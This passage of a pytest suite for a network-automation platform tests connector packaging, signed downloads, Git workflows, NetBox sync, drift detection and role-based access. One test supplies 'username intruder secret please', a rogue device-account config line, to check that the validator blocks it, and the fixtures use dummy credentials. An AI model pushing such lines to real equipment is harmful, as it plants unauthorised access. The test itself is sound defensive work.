    assert "Unable to stop the installed Local Connector process." in combined
    assert "Run uninstall-runner.ps1 from PowerShell opened as Administrator." in combined
    assert 'throw "Runtime removal did not complete:' in combined
    assert '$RuntimeTargets | Where-Object { Test-Path $_ }' in combined
    assert '[Security.Principal.WindowsIdentity]::GetCurrent().Name' in combined
    assert "--windows-console-mode=hide" in combined
    assert "--include-package=pydantic" in combined
    assert "--include-package=tenacity" in combined
    assert "--include-data-dir=" in combined
    assert "runner-source\\templates')=templates" in combined
    assert "Compiled Rez runtime and governed-template smoke checks passed." in combined
    assert 'Where-Object { $_.id -eq "rez_runtime" }' in combined
    assert 'Where-Object { $_.id -eq "governed_templates" }' in combined
    assert "New-ScheduledTaskSettingsSet" in combined
    assert "-ExecutionTimeLimit ([TimeSpan]::Zero)" in combined
    assert "-RestartCount 3" in combined
    assert "-MultipleInstances IgnoreNew" in combined
    assert "-AllowStartIfOnBatteries" in combined
    assert "-DontStopIfGoingOnBatteries" in combined
    assert "Local Connector startup task registration failed." in combined
    assert "Local Connector startup task is not supervising the running process." in combined
    assert "& $Runtime @RuntimeArguments 1>> $StdoutLog 2>> $StderrLog" in combined
    assert "$ExitCode = $LASTEXITCODE" in combined
    assert "$RestartLimit = 3" in combined
    assert "restart attempt $RestartAttempt of $RestartLimit" in combined
    assert "Start-Process -FilePath $Runtime" not in combined

    with zipfile.ZipFile(BytesIO(package), "r") as archive:
        assert "runner-source/templates/arista/ntp_standardize.j2" in archive.namelist()
        assert "runner-source/templates/cisco_ios/ntp_standardize.j2" in archive.namelist()
        checksums = archive.read("SHA256SUMS.txt").decode("utf-8").splitlines()
        for line in checksums:
            expected, name = line.split("  ", 1)
            assert hashlib.sha256(archive.read(name)).hexdigest() == expected


def test_windows_runner_download_endpoint_blocks_unsigned_package_by_default(tmp_path: Path, monkeypatch):
    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("NETCODE_RUNNER_POOL", "pilot")
    monkeypatch.delenv("NETCODE_WINDOWS_DOWNLOAD_ENABLED", raising=False)

    client = TestClient(api.app)
    manifest = client.get("/api/runner/download/windows/manifest").json()
    response = client.get("/api/runner/download/windows")

    assert manifest["ok"] is True
    assert manifest["platform"] == "windows-x64"
    assert manifest["runner_pool"] == "pilot"
    assert manifest["artifact_kind"] == "compiled_windows_connector"
    assert manifest["package_kind"] == "signed_windows_package"
    assert manifest["control_plane_url"] == "http://testserver"
    assert manifest["credentials"] == "local_connector_dpapi_machine_scope"
    assert manifest["python_required"] is False
    assert manifest["source_bundle_included"] is False
    assert manifest["build_scripts_included"] is False
    assert manifest["sample_workflows_included"] is False
    assert manifest["unsigned_download_public"] is False
    assert manifest["production_code_signing_complete"] is False
    assert manifest["available"] is False
    assert manifest["download_status"] == "blocked_pending_signed_package"
    body = json.dumps(manifest)
    assert "pilot_zip" not in body
    assert "build-windows-executable.ps1" not in body
    assert "README.md" not in body
    assert "preflight.ps1" not in body
    assert "runner_source_bundle" not in body
    assert "rez_adapter_bundle" not in body
    assert response.status_code == 401
    assert response.json()["error"] == "windows_download_not_available"


def test_windows_runner_download_endpoint_stays_blocked_without_signed_artifact(tmp_path: Path, monkeypatch):
    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("NETCODE_RUNNER_POOL", "pilot")
    monkeypatch.setenv("NETCODE_WINDOWS_DOWNLOAD_ENABLED", "true")

    client = TestClient(api.app)
    manifest = client.get("/api/runner/download/windows/manifest").json()
    response = client.get("/api/runner/download/windows")

    assert manifest["available"] is False
    assert manifest["download_status"] == "blocked_pending_signed_package"
    assert response.status_code == 401


def test_windows_runner_download_endpoint_returns_only_configured_signed_artifact(tmp_path: Path, monkeypatch):
    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)
    signed = tmp_path / "RezonanceLocalConnector-0.3.3-signed.zip"
    signed.write_bytes(b"signed-package-placeholder")
    monkeypatch.setenv("NETCODE_RUNNER_POOL", "pilot")
    monkeypatch.setenv("NETCODE_WINDOWS_DOWNLOAD_ENABLED", "true")
    monkeypatch.setenv("NETCODE_WINDOWS_SIGNED_ARTIFACT_PATH", str(signed))

    client = TestClient(api.app)
    manifest = client.get(
        "/api/runner/download/windows/manifest",
        headers={"host": "control.rezonancenetworks.com", "x-forwarded-proto": "http"},
    ).json()
    response = client.get("/api/runner/download/windows")

    assert manifest["control_plane_url"] == "https://control.rezonancenetworks.com"
    assert manifest["available"] is True
    assert manifest["production_code_signing_complete"] is True
    assert manifest["download_status"] == "available"
    assert response.status_code == 200
    assert response.headers["content-disposition"] == f'attachment; filename="{signed.name}"'
    assert response.content == b"signed-package-placeholder"


def test_ui_config_persists_editable_options_and_catalog(tmp_path: Path, monkeypatch):
    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)
    client = TestClient(api.app)

    original = client.get("/api/config/ui")
    config = original.json()["config"]
    config["desired_state"]["common"]["device_id"] = "v2-store2"
    config["desired_state"]["change_types"]["add_vlan"]["fields"][1]["value"] = "CORP_WIFI"
    config["discovery"]["defaults"]["groups"] = ["lab", "edge"]

    saved = client.post("/api/config/ui", json={"config": config})
    catalog = client.get("/api/desired-state/catalog")
    reloaded = client.get("/api/config/ui")

    assert original.status_code == 200
    assert saved.status_code == 200
    assert Path(saved.json()["path"]).exists()
    assert reloaded.json()["config"]["desired_state"]["common"]["device_id"] == "v2-store2"
    assert reloaded.json()["history"][-1]["action"] == "updated"
    add_vlan = next(item for item in catalog.json()["change_types"] if item["id"] == "add_vlan")
    assert add_vlan["fields"][1]["value"] == "CORP_WIFI"
    assert reloaded.json()["config"]["discovery"]["defaults"]["groups"] == ["lab", "edge"]


def test_ui_configured_source_of_truth_path_is_used(tmp_path: Path, monkeypatch):
    paths = WorkspacePaths(tmp_path)
    init_workspace(paths)
    monkeypatch.chdir(tmp_path)
    write_yaml(
        paths.inventories / "custom.yaml",
        {
            "defaults": {"username": "admin", "password": "admin", "port": 22, "platform": "arista_eos"},
            "lab_type": "unit",
            "devices": [
                {
                    "id": "custom-leaf1",
                    "hostname": "custom-leaf1",
                    "host": "192.0.2.50",
                    "platform": "arista_eos",
                    "site": "custom-site",
                    "groups": ["custom"],
                }
            ],
        },
    )
    client = TestClient(api.app)
    config = client.get("/api/config/ui").json()["config"]
    config["source_of_truth"]["inventory_path"] = "inventories/custom.yaml"

    saved = client.post("/api/config/ui", json={"config": config})
    source = client.get("/api/source-of-truth")

    assert saved.status_code == 200
    assert source.status_code == 200
    assert Path(source.json()["files"]["inventory"]).parts[-2:] == ("inventories", "custom.yaml")
    assert source.json()["devices"][0]["id"] == "custom-leaf1"


def test_git_setup_endpoint_initializes_runtime_workspace(tmp_path: Path, monkeypatch):
    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)
    client = TestClient(api.app)

    setup = client.post("/api/git/setup", json={"repo_url": "https://example.invalid/network-code.git", "branch": "main"})
    status = client.get("/api/git/status")

    assert setup.status_code == 200
    assert setup.json()["ok"] is True
    assert any(step["command"].startswith("git init") for step in setup.json()["steps"])
    assert status.json()["available"] is True
    assert status.json()["branch"] == "main"
    assert status.json()["remote"] == "https://example.invalid/network-code.git"


def test_git_branch_endpoint_creates_and_switches_change_branch(tmp_path: Path, monkeypatch):
    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)
    client = TestClient(api.app)

    blocked = client.post("/api/git/branch", json={"name": "change/store-1842-add-vlan-90"})
    assert blocked.status_code == 200
    assert blocked.json()["ok"] is False
    assert "not a Git repository" in blocked.json()["message"]

    client.post("/api/git/setup", json={"repo_url": "https://example.invalid/network-code.git", "branch": "main"})

    created = client.post("/api/git/branch", json={"name": "change/store-1842-add-vlan-90"})
    assert created.status_code == 200
    assert created.json()["ok"] is True
    assert created.json()["action"] == "created"
    assert created.json()["current"] == "change/store-1842-add-vlan-90"
    assert any(step["command"].startswith("git checkout -b") for step in created.json()["steps"])

    back = client.post("/api/git/branch", json={"name": "main"})
    assert back.json()["ok"] is True
    assert back.json()["action"] == "switched"

    again = client.post("/api/git/branch", json={"name": "change/store-1842-add-vlan-90"})
    assert again.json()["ok"] is True
    assert again.json()["action"] == "switched"
    assert again.json()["current"] == "change/store-1842-add-vlan-90"

    invalid = client.post("/api/git/branch", json={"name": "bad name!"})
    assert invalid.json()["ok"] is False
    assert invalid.json()["action"] == "blocked"
    assert "not a valid Git branch name" in invalid.json()["message"]

    empty = client.post("/api/git/branch", json={"name": "  "})
    assert empty.json()["ok"] is False

    branches = client.get("/api/git/branches")
    assert branches.status_code == 200
    assert branches.json()["available"] is True
    assert branches.json()["current"] == "change/store-1842-add-vlan-90"
    assert "main" in branches.json()["branches"]


def _fake_netbox(page, status=None):
    status = status or {"netbox-version": "4.1.0"}

    def get_json(url, token, timeout=15.0):
        return status if url.rstrip("/").endswith("/api/status") else page

    return get_json


def test_netbox_sync_imports_devices_into_local_inventory(tmp_path: Path, monkeypatch):
    from netcode import source_of_truth as sot
    from netcode.inventory import Inventory
    from netcode.netbox import NetBoxError
    from netcode.ui_config import configured_inventory_path

    paths = WorkspacePaths(tmp_path.resolve())
    init_workspace(paths)
    monkeypatch.chdir(tmp_path)

    page = {"count": 2, "next": None, "results": [
        {"name": "nb-store9", "site": {"slug": "store-1849"}, "platform": {"slug": "arista-eos"}, "role": {"slug": "access"}, "primary_ip": {"address": "172.100.1.49/24"}, "tags": [{"slug": "pci"}]},
        {"name": "nb core 10", "site": {"slug": "store-1850"}, "platform": {"slug": "cisco-nxos"}, "device_role": {"slug": "core"}, "primary_ip4": {"address": "172.100.1.50/24"}},
    ]}
    get_json = _fake_netbox(page)

    result = sot.netbox_sync(paths, url="https://netbox.example", token="tok", get_json=get_json)
    assert result["ok"] is True
    assert result["imported"] == 2 and result["updated"] == 0

    inv = Inventory(configured_inventory_path(paths))
    assert "nb-store9" in inv.by_id
    assert inv.by_id["nb-store9"].host == "172.100.1.49"
    assert inv.by_id["nb-store9"].platform == "arista_eos"
    assert "netbox" in inv.by_id["nb-store9"].groups and "pci" in inv.by_id["nb-store9"].groups
    assert inv.by_id["nb-core-10"].platform == "cisco_nxos"  # name sanitized to a valid id

    # Re-sync updates existing rows instead of duplicating.
    again = sot.netbox_sync(paths, url="https://netbox.example", token="tok", get_json=get_json)
    assert again["imported"] == 0 and again["updated"] == 2

    # Test connection surfaces version + device count without importing.
    probe = sot.netbox_test(paths, url="https://netbox.example", token="tok", get_json=get_json)
    assert probe["ok"] is True and probe["netbox_version"] == "4.1.0" and probe["device_count"] == 2

    # Fail-closed: a NetBox error returns a structured error, never raises.
    def boom(url, token, timeout=15.0):
        raise NetBoxError("connection refused")
    err = sot.netbox_sync(paths, url="https://netbox.example", token="tok", get_json=boom)
    assert err["ok"] is False and "connection refused" in err["error"]

    # Not configured -> honest error, not a crash.
    assert sot.netbox_test(paths)["ok"] is False


def test_netbox_sync_endpoint(tmp_path: Path, monkeypatch):
    from netcode import netbox

    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)
    page = {"count": 1, "next": None, "results": [
        {"name": "nb-edge", "site": {"slug": "hq"}, "platform": {"slug": "arista-eos"}, "role": {"slug": "edge"}, "primary_ip": {"address": "10.0.0.2/24"}},
    ]}
    monkeypatch.setattr(netbox, "_default_get_json", _fake_netbox(page))
    client = TestClient(api.app)

    synced = client.post("/api/source-of-truth/netbox/sync", json={"url": "https://nb.example", "token": "t"})
    assert synced.status_code == 200
    assert synced.json()["ok"] is True and synced.json()["imported"] == 1
    assert "nb-edge" in synced.json()["devices"]

    # Provider catalog now reflects NetBox as configured (url passed through config path).
    sot = client.post("/api/source-of-truth/netbox/test", json={"url": "https://nb.example", "token": "t"})
    assert sot.json()["ok"] is True


def test_drift_baseline_is_lifecycle_aware():
    """A rolled-back change should read as in-sync when absent (not a false high-severity
    drift); an applied change reads as drift when absent."""
    from netcode.drift import baseline_for_state, vlan_drift_report
    from netcode.paths import WorkspacePaths as WP

    # baseline_for_state maps workflow state -> expected presence.
    assert baseline_for_state("rolled_back")["expected_present"] is False
    assert baseline_for_state("rollback_available")["expected_present"] is True
    assert baseline_for_state("validated")["context"] == "preview"

    import tempfile
    d = Path(tempfile.mkdtemp())
    init_workspace(WP(d))
    intent_path = d / "intents" / "examples" / "add_guest_vlan.yaml"

    # Live state where VLAN 90 is ABSENT.
    state_absent = {"ok": True, "state": {"vlans": []}}

    # Rolled-back change: VLAN absent is CORRECT -> in_sync, not drift.
    base_rb = baseline_for_state("rolled_back")
    rb = vlan_drift_report(WP(d), intent_path, state_absent, expected_present=base_rb["expected_present"], baseline=base_rb["label"], context=base_rb["context"])
    assert rb["status"] == "in_sync" and rb["severity"] == "none"

    # Applied change: VLAN absent is real drift (an applied change went missing).
    base_ap = baseline_for_state("rollback_available")
    ap = vlan_drift_report(WP(d), intent_path, state_absent, expected_present=base_ap["expected_present"], baseline=base_ap["label"], context=base_ap["context"])
    assert ap["status"] == "drifted" and ap["severity"] == "high"

    # Never-applied change: a mismatch is an expected preview, not an alarm.
    base_pv = baseline_for_state("validated")
    pv = vlan_drift_report(WP(d), intent_path, state_absent, expected_present=base_pv["expected_present"], baseline=base_pv["label"], context=base_pv["context"])
    assert pv["status"] == "preview_mismatch" and pv["severity"] == "info"


def test_device_drift_aggregates_committed_intents(tmp_path: Path):
    """Whole-device drift compares live state against the AGGREGATE of every applied
    VLAN intent on the device — not a single change. Rolled-back and never-applied
    changes must not pollute the baseline; the newest applied change wins per VLAN."""
    from netcode.drift import aggregate_device_vlans, device_drift_from_state
    from netcode.models import load_intent

    def write_vlan(name: str, vlan_id: int, vlan_name: str) -> Path:
        path = tmp_path / name
        write_yaml(path, {
            "change_type": "add_vlan",
            "site": "store-1842",
            "targets": {"device_ids": ["v2-store1"]},
            "vlan": {"id": vlan_id, "name": vlan_name, "subnet": f"10.42.{vlan_id}.0/24", "purpose": "data"},
        })
        return path

    p_applied = write_vlan("a.yaml", 90, "GUEST_WIFI")
    p_verified = write_vlan("b.yaml", 20, "VOICE")
    p_rolled = write_vlan("c.yaml", 30, "OLD")
    p_preview = write_vlan("d.yaml", 40, "PROPOSED")

    # newest-first, as list_changes returns them
    changes = [
        {"id": "chg-preview", "device_id": "v2-store1", "workflow_state": "validated", "intent_path": str(p_preview)},
        {"id": "chg-rolled", "device_id": "v2-store1", "workflow_state": "rolled_back", "intent_path": str(p_rolled)},
        {"id": "chg-verified", "device_id": "v2-store1", "workflow_state": "verified", "intent_path": str(p_verified)},
        {"id": "chg-applied", "device_id": "v2-store1", "workflow_state": "rollback_available", "intent_path": str(p_applied)},
        {"id": "chg-other", "device_id": "other-device", "workflow_state": "verified", "intent_path": str(p_applied)},
    ]
    device_changes = [c for c in changes if c["device_id"] == "v2-store1"]
    expected = aggregate_device_vlans(device_changes, load_intent)
    ids = sorted(e["vlan_id"] for e in expected)
    assert ids == [20, 90]  # only applied/verified; rolled-back(30) and preview(40) excluded

    # Live state: VLAN 90 present, VLAN 20 missing -> drift on the aggregate.
    state = {"ok": True, "state": {"vlans": [{"id": 90, "name": "GUEST_WIFI"}]}}
    report = device_drift_from_state(expected, state, "v2-store1")
    assert report["status"] == "drifted" and report["severity"] == "high"
    assert report["expected_count"] == 2 and report["drifted_count"] == 1

    # All present -> in sync.
    state_full = {"ok": True, "state": {"vlans": [{"id": 90, "name": "GUEST_WIFI"}, {"id": 20, "name": "VOICE"}]}}
    ok = device_drift_from_state(expected, state_full, "v2-store1")
    assert ok["status"] == "in_sync" and ok["severity"] == "none"

    # Unreadable device -> unknown, not a false drift.
    unknown = device_drift_from_state(expected, {"ok": False, "error": "unreachable"}, "v2-store1")
    assert unknown["status"] == "unknown"


def test_runner_read_has_fail_closed_timeout(monkeypatch):
    """A hung device read must not wedge the runner's sequential job loop:
    _execute_read enforces a hard deadline and returns an honest failure."""
    import time as _time

    from netcode import runner_agent

    monkeypatch.setattr(runner_agent, "READ_TIMEOUT_SECONDS", 1)

    def hang(action, payload):  # noqa: ANN001
        _time.sleep(5)
        return {"ok": True}

    monkeypatch.setattr(runner_agent, "_execute_read_inner", hang)
    started = _time.monotonic()
    result = runner_agent._execute_read("troubleshoot", {"device_id": "x"})
    elapsed = _time.monotonic() - started

    assert result["ok"] is False
    assert "timed out" in result["error"]
    assert elapsed < 3  # returned at the deadline, not after the hang


def test_rez_refresh_runner_deadline_uses_bridge_timeout(monkeypatch):
    from netcode import runner_agent

    monkeypatch.setattr(runner_agent, "READ_TIMEOUT_SECONDS", 30)
    monkeypatch.setattr(runner_agent, "READINESS_TIMEOUT_SECONDS", 55)
    monkeypatch.setattr(runner_agent, "MAX_READ_TIMEOUT_SECONDS", 120)

    assert runner_agent._read_deadline_seconds("rez_ssh_command", {"_runner_timeout_seconds": 90}) == 30.0
    assert runner_agent._read_deadline_seconds("rez_refresh_targeted", {"_runner_timeout_seconds": 90}) == 90.0
    assert runner_agent._read_deadline_seconds("rez_refresh_targeted", {"_runner_timeout_seconds": 500}) == 120.0
    assert runner_agent._read_deadline_seconds("rez_refresh_targeted", {"_runner_timeout_seconds": "bad"}) == 55.0


def test_workspace_gitignore_tracks_only_artifacts(tmp_path: Path):
    """The seeded workspace .gitignore must exclude platform code so branch switching
    never collides with source files (Marcus's branch-collision bug)."""
    init_workspace(WorkspacePaths(tmp_path))
    subprocess.run(["git", "init", "-q"], cwd=tmp_path, check=True)
    # Simulate a workspace that shares a dir with code.
    (tmp_path / "netcode").mkdir(exist_ok=True)
    (tmp_path / "netcode" / "api.py").write_text("# code\n")
    (tmp_path / "static").mkdir(exist_ok=True)
    (tmp_path / "static" / "app.js").write_text("// code\n")
    tracked = subprocess.run(["git", "add", "-An"], cwd=tmp_path, check=True, capture_output=True, text=True).stdout
    assert "intents/" in tracked  # artifacts ARE tracked
    assert "netcode/" not in tracked and "static/" not in tracked  # code is NOT


def test_change_type_registry_contract_is_complete():
    """Each registered change type must resolve its validator + adapter methods,
    so 'register once' can't silently ship a type with a missing policy/verify handler."""
    from netcode.change_types import REGISTRY
    from netcode.lab import AristaEOSLabAdapter
    from netcode.validation import StaticValidator

    assert set(REGISTRY) == {"add_vlan", "interface_config", "bgp_neighbor", "routing_redistribution", "acl_rule", "site_device_intent", "custom_config", "ntp_standardize", "os_upgrade"}
    for key, spec in REGISTRY.items():
        assert spec.template.endswith(".j2"), key
        assert spec.policy_checks, f"{key} has no policy checks"
        for method in spec.policy_checks:
            assert hasattr(StaticValidator, method), f"{key}: validator is missing {method}"
        assert hasattr(AristaEOSLabAdapter, spec.verify_method), f"{key}: adapter is missing {spec.verify_method}"
        # the pure callables must run against a minimally-built intent without raising
        assert callable(spec.build) and callable(spec.title) and callable(spec.slug)


def test_custom_config_ingests_any_config_with_rollback_discipline(tmp_path: Path, monkeypatch):
    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)
    client = TestClient(api.app)

    def plan_custom(values):
        return client.post(
            "/api/desired-state/plan",
            json={
                "change_type": "custom_config",
                "site": "store-1842",
                "device_id": "v2-store1",
                "requested_by": "unit",
                "values": values,
            },
        )

    # Fail-closed: free-form config without rollback and without acknowledgment is blocked.
    no_rollback = plan_custom({"description": "ntp", "config_lines": "ntp server 10.42.0.10"})
    assert no_rollback.status_code == 200
    assert no_rollback.json()["ok"] is False
    checks = {check["id"]: check["status"] for check in no_rollback.json()["pipeline"]["validation"]["checks"]}
    assert checks["custom_policy"] == "fail"

    # Blocked fragments still apply to free-form config: credentials can never be pushed.
    blocked = plan_custom(
        {
            "description": "bad idea",
            "config_lines": "username intruder secret please",
            "rollback_lines": "no username intruder",
        }
    )
    assert blocked.json()["ok"] is False
    blocked_checks = {check["id"]: check["status"] for check in blocked.json()["pipeline"]["validation"]["checks"]}
    assert blocked_checks["render_scope"] == "fail"

    # Happy path: any feature (NTP here) with engineer-supplied rollback passes the same gates.
    good = plan_custom(
        {
            "description": "NTP servers for store-1842",
            "config_lines": "ntp server 10.42.0.10\nntp server 10.42.0.11",
            "rollback_lines": "no ntp server 10.42.0.10\nno ntp server 10.42.0.11",
            "verify_contains": "ntp server 10.42.0.10",
        }
    )
    assert good.json()["ok"] is True
    rendered = good.json()["pipeline"]["render"]["config"]
    assert rendered == "ntp server 10.42.0.10\nntp server 10.42.0.11\n"  # verbatim: what you paste is what is pushed
    meta = good.json()["plan"]
    assert meta["rollback"]["commands"] == "no ntp server 10.42.0.10\nno ntp server 10.42.0.11\n"
    assert meta["rollback"]["confidence"]["level"] == "medium"
    assert meta["lab_write_supported"] is True
    assert meta["production_write_supported"] is False
    assert "2 free-form config lines" in meta["blast_radius"]["objects"]
    assert meta["suggested_branch"].startswith("change/store-1842-custom-")

    # Explicit no-rollback acknowledgment is allowed but honestly labeled.
    acknowledged = plan_custom(
        {
            "description": "banner",
            "config_lines": "ntp server 10.42.0.12",
            "acknowledge_no_rollback": True,
        }
    )
    assert acknowledged.json()["ok"] is True
    assert acknowledged.json()["plan"]["rollback"]["confidence"]["level"] == "none"


def test_git_commit_and_push_endpoints_report_honestly(tmp_path: Path, monkeypatch):
    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)
    client = TestClient(api.app)

    blocked = client.post("/api/git/commit", json={"message": "before repo"})
    assert blocked.status_code == 200
    assert blocked.json()["ok"] is False
    assert "Select one reviewed change" in blocked.json()["message"]

    client.post("/api/git/setup", json={"repo_url": "https://example.invalid/network-code.git", "branch": "main"})

    plan = client.post(
        "/api/desired-state/plan",
        json={
            "change_type": "add_vlan",
            "site": "store-1842",
            "device_id": "v2-store1",
            "requested_by": "unit",
            "values": {"vlan_id": 91, "name": "AUDIT", "subnet": "10.42.91.0/24", "purpose": "audit"},
        },
    ).json()
    change_id = plan["change"]["id"]
    (tmp_path / "unrelated-secret.txt").write_text(
        "must never enter change history", encoding="utf-8"
    )

    committed = client.post(
        "/api/git/commit",
        json={"message": "Initial artifacts", "change_id": change_id},
    )
    assert committed.status_code == 200
    assert committed.json()["ok"] is True
    assert committed.json()["action"] == "committed"
    assert committed.json()["commit"]
    assert committed.json()["change_history_protected"] is True
    assert str(tmp_path / ".netcode" / "change-history") == committed.json()["workspace"]
    tracked = subprocess.run(
        ["git", "ls-files"],
        cwd=tmp_path / ".netcode" / "change-history",
        capture_output=True,
        text=True,
        check=True,
    ).stdout.splitlines()
    assert "unrelated-secret.txt" not in tracked
    assert all(not path.startswith("../") for path in tracked)
    assert any(path.endswith("change-record.json") for path in tracked)

    again = client.post(
        "/api/git/commit",
        json={"message": "nothing new", "change_id": change_id},
    )
    assert again.json()["ok"] is True
    assert again.json()["action"] == "nothing_to_commit"

    push = client.post("/api/git/push", json={})
    assert push.status_code == 200
    assert push.json()["ok"] is False  # unreachable remote must fail honestly, never silently pass
    assert push.json()["action"] == "failed"
    assert push.json()["steps"][0]["command"].startswith("git push -u origin")


def test_change_record_packages_request_plan_safety_git_and_manifest(tmp_path: Path, monkeypatch):
    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)
    client = TestClient(api.app)

    plan = client.post(
        "/api/desired-state/plan",
        json={
            "change_type": "add_vlan",
            "site": "store-1842",
            "device_id": "v2-store1",
            "requested_by": "unit",
            "values": {"vlan_id": 90, "name": "GUEST_WIFI", "subnet": "10.42.90.0/24", "purpose": "guest"},
        },
    )
    assert plan.status_code == 200
    assert plan.json()["ok"] is True
    meta = plan.json()["plan"]
    assert meta["blast_radius"]["devices"] == ["v2-store1"]
    assert meta["rollback"]["commands"] == "no vlan 90\n"
    assert meta["rollback"]["confidence"]["level"] == "high"
    assert [check["id"] for check in meta["checks"]["pre"]] == ["vlan_absent"]
    assert meta["suggested_branch"] == "change/store-1842-add-vlan-90"
    change_id = plan.json()["change"]["id"]

    client.post("/api/git/setup", json={"repo_url": "", "branch": "main"})
    commit = client.post("/api/git/commit", json={"message": "change artifacts", "change_id": change_id})
    assert commit.json()["ok"] is True
    assert commit.json()["change_event_recorded"] is True

    record = client.get(f"/api/change/{change_id}/record")
    assert record.status_code == 200
    body = record.json()
    assert body["rez_change_id"].startswith("REZ-CHG-")
    assert body["rez_change_id"].endswith(change_id.replace("-", "").upper()[:12])
    assert body["request"]["change_type"] == "add_vlan"
    assert body["request"]["intent_yaml"]
    assert "vlan 90" in body["plan"]["commands"]
    assert body["safety"]["status"] == "pass"
    assert len(body["safety"]["checks"]) == 7
    assert body["lab_proof"]["present"] is False  # no lab in unit tests — honest absence
    manifest = {item["artifact"]: item["exists"] for item in body["manifest"]}
    assert manifest["intent.yaml"] is True
    assert manifest["rendered_config.eos"] is True
    assert any(event["action"] == "git_commit" for event in body["git"]["actions"])

    missing = client.get("/api/change/not-a-real-change/record")
    assert missing.status_code == 404

    # Marcus's bug: a lab action overwrites the change result (no validation/plan). The
    # record must still show safety + change_type, sourced from durable artifacts.
    store = PlatformStore(WorkspacePaths(tmp_path.resolve()))
    store.update_change(change_id, "completed", {"status": "pass", "message": "VLAN applied", "action": "apply"}, workflow_state="rollback_available")
    after = client.get(f"/api/change/{change_id}/record").json()
    assert after["safety"]["status"] == "pass"          # not None after clobber
    assert len(after["safety"]["checks"]) == 7
    assert after["request"]["change_type"] == "add_vlan"  # not None after clobber
    assert after["plan"]["blast_radius"]["devices"] == ["v2-store1"]


def test_auth_rbac_and_tenant_isolation(tmp_path: Path, monkeypatch):
    """M5: with NETCODE_AUTH on, roles are enforced and tenants are isolated."""
    from netcode.auth import hash_password
    from netcode.store import DEFAULT_ORG_ID

    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)

    # Bootstrap seeding is idempotent and env-driven (tested directly since Starlette
    # startup events don't fire for a non-context-manager TestClient).
    monkeypatch.setenv("NETCODE_BOOTSTRAP_ADMIN_EMAIL", "admin@a.co")
    monkeypatch.setenv("NETCODE_BOOTSTRAP_ADMIN_PASSWORD", "s3cret-pw")
    api._bootstrap_admin()
    api._bootstrap_admin()  # idempotent — second call must not raise or duplicate

    monkeypatch.setenv("NETCODE_AUTH", "1")
    client = TestClient(api.app)

    # Unauthenticated is rejected once auth is on.
    assert client.get("/api/changes").status_code == 401

    # Seed extra principals + a second tenant directly in the store.
    # Resolve the path so this store hits the SAME db file the app uses (the app
    # resolves cwd, and on macOS tmp_path is an unresolved /var -> /private/var symlink).
    store = PlatformStore(WorkspacePaths(tmp_path.resolve()))
    store.create_user(DEFAULT_ORG_ID, "op@a.co", hash_password("op-pw"), role="operator")
    store.create_user(DEFAULT_ORG_ID, "view@a.co", hash_password("view-pw"), role="viewer")
    store.ensure_org("org_b", "B", "b")
    store.create_change(tmp_path / "intents" / "examples" / "add_guest_vlan.yaml", "v2-store1", org_id="org_b")

    def login(email, pw):
        r = client.post("/api/auth/login", json={"email": email, "password": pw})
        return r

    assert login("admin@a.co", "wrong").status_code == 401
    admin_tok = login("admin@a.co", "s3cret-pw").json()["token"]
    op_tok = login("op@a.co", "op-pw").json()["token"]
    view_tok = login("view@a.co", "view-pw").json()["token"]
    H = lambda t: {"Authorization": f"Bearer {t}"}

    # Browser sessions are HttpOnly cookies; the standalone UI no longer stores
    # long-lived bearer tokens in localStorage. Header-token clients still work.
    cookie_login = login("admin@a.co", "s3cret-pw")
    assert "HttpOnly" in cookie_login.headers["set-cookie"]
    assert client.get("/api/auth/me").json()["role"] == "admin"

    assert client.get("/api/auth/me", headers=H(admin_tok)).json()["role"] == "admin"

    # Viewer may read but not perform write actions.
    assert client.get("/api/changes", headers=H(view_tok)).status_code == 200
    blocked = client.post(
        "/api/desired-state/plan",
        headers=H(view_tok),
        json={"change_type": "add_vlan", "site": "store-1842", "device_id": "v2-store1", "requested_by": "v",
              "values": {"vlan_id": 90, "name": "GUEST_WIFI", "subnet": "10.42.90.0/24", "purpose": "guest"}},
    )
    assert blocked.status_code == 403

    # Operator may create a change; it is stamped to their org (org_default).
    made = client.post(
        "/api/desired-state/plan",
        headers=H(op_tok),
        json={"change_type": "add_vlan", "site": "store-1842", "device_id": "v2-store1", "requested_by": "op",
              "values": {"vlan_id": 90, "name": "GUEST_WIFI", "subnet": "10.42.90.0/24", "purpose": "guest"}},
    )
    assert made.status_code == 200

    # Tenant isolation: org_default users never see org_b's change, by list or by id.
    listed = client.get("/api/changes", headers=H(admin_tok)).json()["changes"]
    assert all(c["org_id"] == DEFAULT_ORG_ID for c in listed)
    org_b_change = next(c for c in store.list_changes(org_id="org_b"))
    assert client.get(f"/api/change/{org_b_change.id}/record", headers=H(admin_tok)).status_code == 404

    # Admin-only: minting a runner join token needs admin, not operator/viewer.
    assert client.post("/api/runners/join-token", headers=H(view_tok), json={"pool": "p"}).status_code == 403
    assert client.post("/api/runners/join-token", headers=H(op_tok), json={"pool": "p"}).status_code == 403
    assert client.post("/api/runners/join-token", headers=H(admin_tok), json={"pool": "p"}).json()["ok"] is True

    # Logout revokes the session.
    assert client.post("/api/auth/logout", headers=H(view_tok)).json()["ok"] is True
    assert client.get("/api/changes", headers=H(view_tok)).status_code == 401


def test_readiness_devices_reports_per_device_readability_honestly(tmp_path: Path, monkeypatch):
    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)
    client = TestClient(api.app)

    readiness = client.post("/api/readiness/devices")

    assert readiness.status_code == 200
    body = readiness.json()
    # No Rez drivers in unit tests: every seeded device must be reported unreadable, never fake-green.
    assert body["ok"] is False
    assert body["tested"] == 3
    assert body["readable"] == 0
    assert {device["id"] for device in body["devices"]} == {"v2-store1", "v2-store2", "v2-store3"}
    assert all(device["error"] for device in body["devices"])
    assert "0/3" in body["message"]


